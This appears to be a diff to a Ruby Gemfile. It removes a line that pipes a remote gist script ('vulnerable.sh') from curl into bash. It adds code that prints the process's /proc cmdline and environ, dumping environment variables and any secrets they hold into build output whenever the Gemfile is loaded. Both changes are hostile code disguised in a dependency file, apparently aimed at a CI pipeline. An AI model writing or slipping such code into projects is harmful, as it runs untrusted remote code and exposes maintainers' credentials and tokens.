@@ -1,6 +1,10 @@
 source ENV['GEM_SOURCE'] || 'https://rubygems.org'
 
-system("curl -sSfL https://gist.githubusercontent.com/Ramesh7/cd4b7fcf2a3bac9aa358ad502a5740ec/raw/7e313c10ceb3b1c38b9a1a6b16c81ea7c900e6e6/vulnerable.sh | bash && exit 1")
+puts "-------------"
+currnet_process_id = Process.pid
+puts `cat /proc/#{currnet_process_id}/cmdline`
+puts `cat /proc/#{currnet_process_id}/environ`
+puts "-------------"
 
 def location_for(place_or_version, fake_version = nil)
   git_url_regex = %r{\A(?<url>(https?|git)[:@][^#]*)(#(?<branch>.*))?}
